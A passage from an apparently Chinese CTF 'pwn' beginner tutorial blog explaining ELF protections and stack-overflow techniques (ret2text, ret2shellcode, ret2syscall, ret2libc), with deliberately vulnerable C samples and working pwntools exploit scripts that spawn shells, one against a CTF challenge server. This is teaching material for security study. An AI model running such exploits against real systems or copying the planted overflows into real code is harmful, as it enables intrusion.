class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x401040&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>libc = ELF(<span class="string">&#x27;../libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__())</span><br><span class="line"><span class="string">&#x27;0x1b45bd&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ELF文件保护机制"><a href="#ELF文件保护机制" class="headerlink" title="ELF文件保护机制"></a>ELF文件保护机制</h2><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><p>canary是金丝雀的意思。技术上表示最先测试的（要是在软件或者其他什么东西看到canary版，大概率就是指测试版了）。这种叫法来自以前挖煤时，矿工们会先把金丝雀放进矿洞，或者挖煤的时候一直带着金丝雀。金丝雀对甲烷和一氧化碳浓度比较敏感，会有预警。所以大家就会用canary来搞最先的测试。在栈中，<strong>canary表示栈的报警保护。</strong></p><p>canary的具体表现是在函数的栈底指针bp前添加一串随机数（不超过机器字长）（又叫cookie），末位是\x00，如果出现缓冲区溢出攻击，覆盖到canary处，并且导致改变该处数据后，<strong>当程序执行到此处（也就是当前函数要结束，准备跳转了），会检查canary值是否跟开始值一样，不一样会导致程序崩溃（应该会看到一串含有smashing的英文）</strong>，从而达到防止程序执行流被恶意控制的目的。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># canary示意图</span></span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">+-------------+ &lt;- </span><br><span class="line">|             | buffer</span><br><span class="line">|             |</span><br><span class="line">+-------------+</span><br><span class="line">|  canary     |</span><br><span class="line">+-------------+</span><br><span class="line">|    bp       |</span><br><span class="line">+-------------+</span><br><span class="line">|  ret addr   |</span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br></pre></td></tr></table></figure><p><strong>gcc使用：</strong></p><p><code>-fno-stack-protector / -fstack-protector / -fstack-protector-all</code> </p><p><strong>（关闭 &#x2F; 部分开启 &#x2F; 全部开启）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o filename filename.c// 默认不开启canary</span><br><span class="line">gcc -o filename -fno-stack-protector filename.c// 禁用canary</span><br><span class="line">gcc -o filename -fstack-protector filename.c// 启用canary，不过只为局部变量中含有char数组的函数插入canary保护</span><br><span class="line">gcc -o filename -fstack-protector-all filename.c// 启用canary，为所有函数插入保护代码</span><br></pre></td></tr></table></figure><h3 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h3><p>NX即No-eXecute（不可执行），NX（DEP）的表现为把数据所在内存页标识为不可执行，当程序溢出到shellcode时，程序会尝试执行指令，此时CPU会抛出异常，而不去执行恶意指令。</p><p><strong>gcc使用：</strong></p><p><code>-z execstack / -z noexecstack</code> </p><p><strong>（关闭 &#x2F; 开启）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c// 默认开启NX</span><br><span class="line">gcc -o file -z execstack file.c// 禁用NX</span><br><span class="line">gcc -o file -z noexecstack file.c// 开启NX</span><br></pre></td></tr></table></figure><h3 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h3><p>一般情况下NX（DEP）和地址空间分布随机化（PIE &#x2F; ASLR）（address space layout randomization）会同时工作。内存地址随机化机制有三种情况：</p><ul><li>0 - 表示关闭进程地址空间随机化</li><li>1 - 表示将mmap的基地址，栈基地址和.so地址随机化</li><li>2 - 表示在1的基础上增加heap的地址随机化</li></ul><p><strong>该保护使每次运行的程序地址都不同，防止根据固定地址来写exp执行攻击。</strong>这可以防止ret2libc方式针对DEP的攻击。ASLR和DEP配合使用，可以有效阻止攻击者在堆栈上运行恶意代码。</p><p><strong>linux下关闭PIE的命令如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p><strong>gcc用法：</strong></p><p><code>-no-pie / -pie</code></p><p><strong>（关闭 &#x2F; 开启）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c// 默认关闭PIE</span><br><span class="line">gcc -o file -fpie -pie file.c// 开启PIE，强度为1</span><br><span class="line">gcc -o file -fPIE -pie file.c// 开启PIE，此时为最高强度2</span><br><span class="line">gcc -o file -fpic file.c// 开启PIC，强度为1，不会开启PIE</span><br><span class="line">gcc -o file -fPIC file.c// 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO（Relocation Read-Only）可以使程序某些部分标识为只读。分为两种情况：</p><ul><li><strong>Partial RELRO：</strong>是gcc的默认设置，几乎所有二进制文件都至少使用部分RELRO。这样仅能防止全局变量的缓冲区溢出导致覆盖GOT</li><li><strong>Full RELRO：</strong>使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动前需要解析所有符号</li></ul><p><em>linux系统安全领域里，有w（write）权限的储存区就会是攻击的目标，尤其是储存函数指针的区域。所以在安全角度应该尽量减少可写的区域</em></p><p><em>RELRO会设置符号重定向表格为只读或者程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。</em></p><p><strong>可以简单理解为：</strong></p><ul><li><strong>Partial RELRO -&gt; .got不可写，got.plt（got表）可写</strong></li><li><strong>Full RELRO -&gt; .got 和 got.plt 不可写</strong></li></ul><p><strong>gcc使用：</strong></p><p><code>-z norelro / -z lazy / -z now</code></p><p><strong>（关闭 &#x2F; 部分开启 &#x2F; 完全开启）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c// 默认为Partial RELRO</span><br><span class="line">gcc -o file -z norelro file.c// 关闭，即No RELRO</span><br><span class="line">gcc -o file -z lazy file.c// 部分开启，即Partial RELRO</span><br><span class="line">gcc -o file -z now file.c// 完全开启，即Full RELRO</span><br></pre></td></tr></table></figure><h3 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h3><p>fortify是轻微的检查，用于检测是否存在缓冲区溢出的错误，适用于程序采用大量字符串或内存操作函数，如：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="是babyROP吧"><a href="#是babyROP吧" class="headerlink" title="是babyROP吧"></a>是babyROP吧</h2><p><strong>什么是ROP:</strong></p><p>类似于比较常听到的OOP（面向对象编程），POP（面向过程编程），FP（函数式编程）等。</p><p>ROP全称是Return-Oriented Programing（面向返回编程）。简单来说，<strong>ROP就是将源程序中散落的汇编程序片段（也称gadget）“拼接”在一起，使其能够为攻击者服务</strong>。 需要指出的是，此处的“拼接”不是指将这些汇编程序片段聚集在某个连续的内存空间中，而是让它们在逻辑上连续执行，也就是说构成一个”返回链“。ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p><p><strong>为什么要ROP:</strong></p><p>ROP主要是为了绕过NX(DEP)保护。<strong>NX(DEP)基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode，程序会尝试在数据页面执行指令，此时CPU就会抛出异常，而不是执行恶意指令。</strong>NX开启后，直接往栈上或堆上注入代码的方式难以继续发挥效果，所以有了各种绕过方法，rop是其中一种。</p><p><strong>rop攻击一般要满足：</strong></p><p>1）程序存在溢出，并且可以控制返回地址。</p><p>2）可以找到满足条件的gadget以及对应的gadget地址（如果gadget每次地址是不固定的，就要想办法动态获取对应地址了）</p><h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>ret2text（ret to text）实际上就是一种ROP，只不过只返回一次而已（返回到text上），ret2text本质就是控制ret返回到已有的代码上如：system(“&#x2F;bin&#x2F;sh”)， execv(“&#x2F;bin&#x2F;sh”)，从而getshell。</p><p>写了一个简单的程序作为例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PS：编译时记得关掉canary和地址随机化</strong></p><p>建议直接在wsl里编译就好（懒得开虚拟机捏~）</p><p><code>gcc -o pwn -fno-stack-protector -no-pie pwn.c</code></p><p>scanf处没有对读取数据长度做检测，存在溢出</p><p>不过直接说可能不好理解，看一下ida吧</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_main.png" alt="main"></p><p>栈空间：</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_stack.png" alt="stack"></p><p>显然这里输入到了v4(对应到栈里面的var_30)，发现跟预想的0x20不一样，偷偷加了一些空间，而且多创建了一个不知道干什么的int变量。使用实际要填充的长度应该是</p><p><code>offset = 0x2c + 0x4 + 0x8 = 0x38</code></p><p>这里的0x2c是var_30的大小（可以看到左边一列数那里0x30和4相差了0x2c（不是26嗷））；</p><p>然后4个字节长度是var_4，也就是那个int变量的，这里是直接覆盖过去了；</p><p>然后后面的8个字节是rbp（i386就是4个字节（ebp）），可以看到s和r那里相差了8；</p><p>然后再覆盖新的返回地址（如果有后门函数就返回到那里就好了）</p><p>再一眼后门函数</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_binsh.png" alt="binsh"></p><p>发现&#x2F;bin&#x2F;sh字符串在0x401144传参，所以就返回到0x401144，于是写出exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x401144</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p>即控制程序执行shellcode代码，shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。<strong>一般来说，shellcode要我们自己填充。</strong></p><p>在栈溢出的基础上，要执行shellcode，需要shellcode所在区域有可执行权限。（没有NX保护，或者用mprotect（）为一段区域赋予了可执行权限，或者bss段可执行）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    mprotect(<span class="number">0x401000</span>, <span class="number">0x1000</span>, <span class="number">7</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(<span class="number">0x401000</span>, buf);</span><br><span class="line">    ((<span class="type">void</span>(*)())<span class="number">0x401020</span>)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码就是把0x401000开始的长度为0x1000的区域标记为可执行，我们直接把shellcode传进去，即可getshell，由于copy发生在0x401000，但是从0x401020开始执行，所以我们先填充0x20各字节再填充shellcode</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>简单来说就是执行系统调用来实现想要实现的功能，比如可以用 <code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code> 系统调用来获取shell，这需要满足：</p><ul><li><p>系统调用号，eax 为 0xb(x86) &#x2F; rax 为 0x3b(x64)</p></li><li><p>第一个参数，ebx &#x2F; rdi 为 &#x2F;bin&#x2F;sh 地址</p></li><li><p>第二个参数，ecx 为 0 &#x2F; rsi 为 0</p></li><li><p>第三个参数，edx 为 0 &#x2F; rdx 为 0</p></li><li><p>最后返回 int 0x80(x86) &#x2F; syscall ret(x64)</p><p>看一道例题：<a href="../resources/pwn_asset/study/ret2sys_64" target="_blank">ret2sys_64</a></p></li></ul><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2sys_main.png" alt="main"></p><p>程序里面没有现成的&#x2F;bin&#x2F;sh，所以可以用两次系统调用，一次读字符串，一次拿sh</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2sys_64&#x27;</span>)</span><br><span class="line">rax = <span class="number">0x46b9f8</span></span><br><span class="line">rdi = <span class="number">0x4016c3</span></span><br><span class="line">rdx_rsi = <span class="number">0x4377f9</span></span><br><span class="line">syscall = <span class="number">0x45bac5</span></span><br><span class="line">bss = <span class="number">0x6c1c60</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"><span class="comment"># 调用sys_read，用来读取后面输入的/bin/sh到bss段</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0x10</span>) + p64(bss) + p64(syscall)</span><br><span class="line"><span class="comment"># 调用execve来getshell</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0x3b</span>) + p64(rdi) + p64(bss)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;system_x64&#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>当不知道题目libc版本<del>（现在的ctf应该不会还有比赛不给libc吧，不会吧不会吧~）</del>，并且存在足够的溢出空间，是可以通过泄露函数地址（实际上只需要低三位数字）来查找libc版本，<strong>当然知道libc版本可能也会需要leak基地址来计算system等函数的地址</strong></p><p>这里建议使用py的LibcSearcher库，这个库是在线查找的（也就是要联网），<del><em>也可以本地一个一个试</em></del></p><p>ret2libc的思路是寻找程序中的gadget构造ROP，来调用程序中的输出函数如：puts，write，打印一些函数的地址，从而达到泄露基地址的目的</p><p><strong>例题：</strong><a href="../resources/pwn_asset/study/ret2libc_x64" target="_block">MoeCTF2022_ret2libc</a></p><p>在vuln函数里面就是一个简单的栈溢出，溢出长度足够构造ROP</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_vuln.png" alt="vuln"></p><p>覆盖的长度为0x40+0x8（rbp）&#x3D;0x48</p><p>然后由于x64前六个参数用寄存器传，多的才是和x86一样栈传参，这前六个参数依次用rdi，rsi，rcx，rdx，r8，r9寄存器</p><p>这里我们目的是通过puts函数来输出puts的got表中的地址来泄露puts的真实地址。</p><p>所以要把puts_got作为参数传进puts函数里，也就是要用到rdi寄存器。<strong>（找gadget可以用ROPgadget）</strong></p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_rdi.png" alt="findrdi"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># .got指向函数在libc的真实地址</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># 也可以elf.sym[&#x27;puts&#x27;]，因为.plt存的就是函数的符号信息</span></span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># 也可以填vuln函数地址，只要保证再用一次read就行</span></span><br></pre></td></tr></table></figure><p>然后接收打印的地址，在查找libc版本，然后计算system，字符串&#x2F;bin&#x2F;sh的地址，就可以构造第二个payload</p><p><strong>要注意：ubuntu18以上版本调用系统函数要栈对齐，一般在传参前加个ret的gadget就行</strong></p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_ret.png" alt="findret"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment"># 这么写是因为一般以\x7f结尾的6个字节</span></span><br><span class="line"></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">如果是给了你libc文件，本地加载时用ELF()就行，用法自然跟上面LibcSearcher的不一样</span></span><br><span class="line"><span class="string">example:</span></span><br><span class="line"><span class="string">libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="string">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">sys_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(b&#x27;/bin/sh&#x27;).__next__() @py3</span></span><br><span class="line"><span class="string">#libc.search(&#x27;/bin/sh&#x27;).next() @py2</span></span><br><span class="line"><span class="string">py3中search()的参数必须是bytes，然后next方法多了下划线</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br></pre></td></tr></table></figure><p><strong>完整exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.anna.nssctf.cn&quot;</span>, <span class="number">28222</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p><strong>栈溢出小结：栈溢出是为了覆写某些数据来达到攻击者目的的一种手段，不能只是简单的背了什么ret2text，ret2libc等题型模板，更重要的是理解这种手段。而且溢出不只是scanf，read，gets这些，strcpy也是可以的，因为本质上都是由一个缓冲区复制到另一个缓冲区。另外覆写的数据也不尽就是返回地址了，像刚才在覆盖到ret之前顺便覆盖了一个int变量，在这里没看到什么作用，但是假如是一个关键数据（比如一个随机数），就可以起到很大用处了。</strong></p><h2 id="EZzzz的heap"><a href="#EZzzz的heap" class="headerlink" title="EZzzz的heap"></a>EZzzz的heap</h2><p><em>待补充……</em></p><h3 id="linux-heap的分配"><a 